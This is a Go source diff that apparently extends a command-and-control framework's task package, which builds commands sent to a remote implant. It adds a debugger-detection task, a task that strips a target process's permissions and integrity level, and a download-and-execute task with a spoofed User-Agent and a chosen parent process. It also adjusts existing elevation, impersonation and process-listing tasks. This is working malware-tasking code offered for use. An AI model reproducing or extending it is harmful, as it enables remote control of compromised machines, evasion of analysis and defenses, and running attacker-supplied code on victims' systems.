@@ -5,6 +5,7 @@ package task
 import (
 	"io"
 	"os"
+	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
@@ -67,14 +68,14 @@ func Refresh() *com.Packet {
 // Always returns 'ErrNoWindows' on non-Windows devices.
 //
 // C2 Details:
-//  ID: MvRevSelf
+//  ID: TvRevSelf
 //
 //  Input:
 //      <none>
 //  Output:
 //      <none>
 func RevToSelf() *com.Packet {
-	return &com.Packet{ID: MvRevSelf}
+	return &com.Packet{ID: TvRevSelf}
 }
 
 // ScreenShot returns a screenshot Packet. This will instruct the client to
@@ -122,11 +123,26 @@ func Ls(d string) *com.Packet {
 	return n
 }
 
+// IsDebugged returns a check debugger status Packet. This can be used to instruct
+// the client to return a boolean value determing if it is currently attached or
+// being run by a debugger.
+//
+// C2 Details:
+//  ID: MvCheckDebug
+//
+//  Input:
+//      <none>
+//  Output:
+//      bool // True if being debugged, false otherwise
+func IsDebugged() *com.Packet {
+	return &com.Packet{ID: MvCheckDebug}
+}
+
 // ProcessList returns a list processes Packet. This can be used to instruct
 // the client to return a list of the current running host's processes.
 //
 // C2 Details:
-//  ID: TvProcList
+//  ID: MvProcList
 //
 //  Input:
 //      <none>
@@ -138,7 +154,7 @@ func Ls(d string) *com.Packet {
 //          string          // Process Image Name
 //      }
 func ProcessList() *com.Packet {
-	return &com.Packet{ID: TvProcList}
+	return &com.Packet{ID: MvProcList}
 }
 
 // Cwd returns a change directory Packet. This can be used to instruct the
@@ -285,6 +301,26 @@ func Move(src, dst string) *com.Packet {
 	return n
 }
 
+// Wait returns a wait -n- sleep Packet. This can be used to instruct to the
+// client to pause processing for the specified duration.
+//
+// This Task only has an affect during Scripts as most operations are threaded.
+//
+// If the time is less than or equal to zero, the task will become a NOP.
+//
+// C2 Details:
+//  ID: TvWait
+//
+//  Input:
+//      uint64 // Wait duration
+//  Output:
+//      <none>
+func Wait(d time.Duration) *com.Packet {
+	n := &com.Packet{ID: TvWait}
+	n.WriteUint64(uint64(d))
+	return n
+}
+
 // Copy returns a file copy Packet. This can be used to instruct to copy the
 // specified source file to the specified destination path.
 //
@@ -327,10 +363,7 @@ func Copy(src, dst string) *com.Packet {
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
 func Pull(url, path string) *com.Packet {
-	n := &com.Packet{ID: TvPull}
-	n.WriteString(url)
-	n.WriteString(path)
-	return n
+	return PullAgent(url, "", path)
 }
 
 // ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
@@ -355,6 +388,33 @@ func ProxyRemove(name string) *com.Packet {
 	return n
 }
 
+// UnTrust returns an Untrust Packet. This will instruct the client to use the
+// provided Filter to attempt to "Untrust" the targeted process by removing all
+// of it's permissions and setting it's integrity level to "Untrusted".
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUnTrust
+//
+//  Input:
+//      Filter struct { // Filter
+//          bool        // Filter Status
+//          uint32      // PID
+//          bool        // Fallback
+//          uint8       // Session
+//          uint8       // Elevated
+//          []string    // Exclude
+//          []string    // Include
+//      }
+//  Output:
+//      <none>
+func UnTrust(f *filter.Filter) *com.Packet {
+	n := &com.Packet{ID: TvUnTrust}
+	f.MarshalStream(n)
+	return n
+}
+
 // Elevate returns an evelate Packet. This will instruct the client to use the
 // provided Filter to attempt to get a Token handle to an elevated process. If
 // the Filter is nil, then the client will attempt at any elevated process.
@@ -362,7 +422,7 @@ func ProxyRemove(name string) *com.Packet {
 // Always returns 'ErrNoWindows' on non-Windows devices.
 //
 // C2 Details:
-//  ID: MvElevate
+//  ID: TvElevate
 //
 //  Input:
 //      Filter struct { // Filter
@@ -377,7 +437,7 @@ func ProxyRemove(name string) *com.Packet {
 //  Output:
 //      <none>
 func Elevate(f *filter.Filter) *com.Packet {
-	n := &com.Packet{ID: MvElevate}
+	n := &com.Packet{ID: TvElevate}
 	f.MarshalStream(n)
 	return n
 }
@@ -483,6 +543,34 @@ func Proxy(name, addr string, p []byte) *com.Packet {
 	return n
 }
 
+// PullAgent returns a pull Packet. This will instruct the client to download the
+// resource from the provided URL and write the data to the supplied local
+// filesystem path.
+//
+// The supplied 'agent' string (if non-empty) will specify the User-Agent header
+// string to be used.
+//
+// The path may contain environment variables that will be resolved during
+// runtime.
+//
+// C2 Details:
+//  ID: TvPull
+//
+//  Input:
+//      string // URL
+//      string // User-Agent
+//      string // Target Path
+//  Output:
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
+func PullAgent(url, agent, path string) *com.Packet {
+	n := &com.Packet{ID: TvPull}
+	n.WriteString(url)
+	n.WriteString(agent)
+	n.WriteString(path)
+	return n
+}
+
 // LoginUser returns an impersonate user Packet. This will instruct the client to
 // use the provided credentials to change it's Token to the user that owns the
 // supplied credentials.
@@ -526,7 +614,8 @@ func LoginUser(user, domain, pass string) *com.Packet {
 //      string // Expanded Destination Path
 //      uint64 // Byte Count Written
 func UploadFile(dst, src string) (*com.Packet, error) {
-	f, err := os.OpenFile(device.Expand(src), os.O_RDONLY, 0)
+	// 0 - READONLY
+	f, err := os.OpenFile(device.Expand(src), 0, 0)
 	if err != nil {
 		return nil, err
 	}
@@ -615,8 +704,47 @@ func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
 //      uint32          // PID
 //      int32           // Exit Code
 func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
+	return PullExecuteAgent(url, "", w, f)
+}
+
+// PullExecuteAgent returns a pull and execute Packet. This will instruct the client
+// to download the resource from the provided URL and execute the downloaded data.
+//
+// The supplied 'agent' string (if non-empty) will specify the User-Agent header
+// string to be used.
+//
+// The download data may be saved in a temporary location depending on what the
+// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
+//
+// This function allows for specifying a Filter struct to specify the target
+// parent process and the boolean flag can be set to true/false to specify
+// if the task should wait for the process to exit.
+//
+// Returns the same output as the 'Run*' tasks.
+//
+// C2 Details:
+//  ID: TvPullExecute
+//
+//  Input:
+//      string          // URL
+//      string          // User-Agent
+//      bool            // Wait
+//      Filter struct { // Filter
+//          bool        // Filter Status
+//          uint32      // PID
+//          bool        // Fallback
+//          uint8       // Session
+//          uint8       // Elevated
+//          []string    // Exclude
+//          []string    // Include
+//      }
+//  Output:
+//      uint32          // PID
+//      int32           // Exit Code
+func PullExecuteAgent(url, agent string, w bool, f *filter.Filter) *com.Packet {
 	n := &com.Packet{ID: TvPullExecute}
 	n.WriteString(url)
+	n.WriteString(agent)
 	n.WriteBool(w)
 	f.MarshalStream(n)
 	return n
